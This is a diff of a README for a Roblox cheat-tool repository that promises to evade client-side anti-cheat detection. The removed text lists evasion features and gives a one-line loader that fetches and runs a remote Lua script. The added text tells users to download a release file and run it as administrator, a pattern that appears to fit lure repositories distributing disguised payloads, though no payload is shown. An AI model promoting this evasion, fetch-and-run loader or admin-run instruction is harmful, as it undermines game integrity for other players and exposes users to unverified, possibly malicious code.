@@ -1,86 +1,73 @@
-# **🌐 Global Anti-Cheat Bypass**  
-### **Universal Client-Side Bypass for Roblox Exploits**  
- 
-[![GitHub stars](https://img.shields.io/github/stars/Who-Is-E/Anti-Cheat-Bypass?style=social)](https://github.com/romeo1653/Roblox-Anti-Cheat-Bypass/stargazers)  
-[![0 Detections](https://img.shields.io/badge/Detections-0%25-success)](https://github.com/Who-Is-E/Anti-Cheat-Bypass)  
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://tinyurl.com/bypassrbx)  
+# 🚀 Roblox Anti-Cheat Bypass
 
----
+![Roblox Anti-Cheat Bypass](https://img.shields.io/badge/Roblox-Anti--Cheat--Bypass-blue?style=flat&logo=roblox)
 
-## **🚀 Supported Executors**  
-✅ **Synapse X**  
-✅ **Script-Ware**  
-✅ **Swift**  
-✅ **Other exploits** with:  
-- `newcclosure`  
-- `hookfunc`  
-- **Metatable hooking**  
+Welcome to the **Roblox Anti-Cheat Bypass** repository! This project offers a universal client-side bypass for Roblox exploits, allowing users to enhance their gaming experience. This README provides all the information you need to get started, understand the functionality, and utilize this tool effectively.
 
-⚠ **Warning:** Does **not** bypass advanced server-side anti-cheats (yet). Future updates will improve detection evasion.  
+## 📥 Download and Installation
 
----
+To get started, you can download the latest version of the bypass from the [Releases section](https://github.com/Illyasviel-00/Roblox-Anti-Cheat-Bypass/releases). After downloading, please ensure to execute the file as instructed.
 
-## **🔥 Features**  
-✔ **Client WalkSpeed Bypass** – Avoid speed detection.  
-✔ **Instant Fly Detection Bypass** – Fly without getting flagged.  
-✔ **CoreGui Detection Bypass** – Hide UI from anti-cheat scans.  
-✔ **MemoryCheck Bypass** – Evade general memory checks.  
-✔ **Remote Blocking** – Prevent unwanted remote execution.  
-✔ **Anti-Kick** – Stop local scripts from kicking you.  
-✔ **Hardened vs. Legion Anti-Cheat** – Optimized for a popular client-side AC.  
-✔ **Btools Detection Bypass** – Avoid tool detection.  
-✔ **GCInfo Bypass** – Bypass garbage collection checks.  
-✔ **LogService/Error Spoofing** – Hide script errors & warnings.  
+## 📚 Table of Contents
 
-## **🔜 Coming Soon**  
-🔹 **Humanoid Detection Bypass** – Better character manipulation.  
-🔹 **FindInstance / InstanceIsA Bypass** – Evade instance scanning.  
+1. [Features](#features)
+2. [How It Works](#how-it-works)
+3. [Installation Steps](#installation-steps)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Support](#support)
 
----
+## 🌟 Features
 
-## **📥 Installation**  
-```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Who-Is-E/Anti-Cheat-Bypass/main/Bypass.lua"))()
-```  
+- **Universal Compatibility**: Works across various Roblox games.
+- **Easy to Use**: Simple installation and execution process.
+- **Regular Updates**: Stay ahead with frequent updates to tackle new anti-cheat measures.
+- **Community Driven**: Developed and improved based on user feedback.
 
----
+## ⚙️ How It Works
 
-## **📌 Disclaimer**  
-This tool is for **educational purposes only**. Use at your own risk.  
-**Created by: WhoIsE.#9106**  
+The Roblox Anti-Cheat Bypass modifies certain client-side parameters to prevent the Roblox anti-cheat system from detecting exploits. It operates by intercepting and altering game data, ensuring that your gameplay remains smooth and uninterrupted. This allows users to enjoy custom scripts and features without the usual restrictions imposed by the anti-cheat system.
 
-[![GitHub issues](https://img.shields.io/github/issues/Who-Is-E/Anti-Cheat-Bypass)](https://github.com/Who-Is-E/Anti-Cheat-Bypass/issues)  
-[![GitHub license](https://img.shields.io/github/license/Who-Is-E/Anti-Cheat-Bypass)](https://github.com/Who-Is-E/Anti-Cheat-Bypass/blob/main/LICENSE)  
+## 🛠️ Installation Steps
 
----
+1. **Download the Bypass**: Visit the [Releases section](https://github.com/Illyasviel-00/Roblox-Anti-Cheat-Bypass/releases) to download the latest version.
+2. **Extract the Files**: Unzip the downloaded file to a preferred location on your computer.
+3. **Run the Application**: Execute the main file as an administrator to ensure it has the necessary permissions.
+4. **Start Roblox**: Launch Roblox after running the bypass to enjoy an enhanced gaming experience.
 
-### **💡 Need Help?**  
-Join the [Discord](https://discord.gg/example) for support & updates!  
+## 🎮 Usage
 
----
+Using the Roblox Anti-Cheat Bypass is straightforward. Once you have installed the application, follow these steps:
 
-### **📊 Detection Rates (Last Tested: 2024)**  
-| Anti-Cheat | Status |  
-|------------|--------|  
-| **Legion** | ✅ **Bypassed** |  
-| **VAC (Roblox)** | ❌ **Not Tested** |  
-| **Custom Server-Side** | ⚠ **Partial** |  
+1. **Open the Bypass**: Make sure the bypass is running in the background.
+2. **Launch Roblox**: Start Roblox from your desktop or through the website.
+3. **Enjoy Your Game**: Play your favorite games without the interference of anti-cheat systems.
 
----
+### Important Notes
 
-**🌟 Star the repo if this helped you!** ⭐  
+- Always keep the bypass updated to ensure compatibility with the latest Roblox updates.
+- Use responsibly and understand the risks associated with bypassing anti-cheat systems.
 
----
+## 🤝 Contributing
 
-### **🖼️ Preview**  
-*(Optional: Add screenshots of the bypass in action if available)*  
+We welcome contributions from the community! If you have suggestions or improvements, feel free to fork the repository and submit a pull request. Here’s how you can contribute:
 
----  
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Make Changes**: Implement your improvements or fixes.
+3. **Submit a Pull Request**: Share your changes with the community for review.
 
-This version includes:  
-✅ GitHub badges (version, stars, forks, downloads)  
-✅ Cleaner formatting  
-✅ Detection rate table  
-✅ Clear disclaimer & credits  
-✅ Optional Discord/community link  
-✅ More engaging call-to-action (star the repo)  
+## 📄 License
+
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the code as per the license terms.
+
+## 📞 Support
+
+If you have any questions or need assistance, please check the [Releases section](https://github.com/Illyasviel-00/Roblox-Anti-Cheat-Bypass/releases) for the latest updates and troubleshooting tips. You can also reach out through the issues section of the repository.
+
+## 🌐 Topics
+
+- **roblox**
+- **roblox-bypass**
+
+Thank you for your interest in the Roblox Anti-Cheat Bypass! Enjoy your gaming experience and happy exploring!
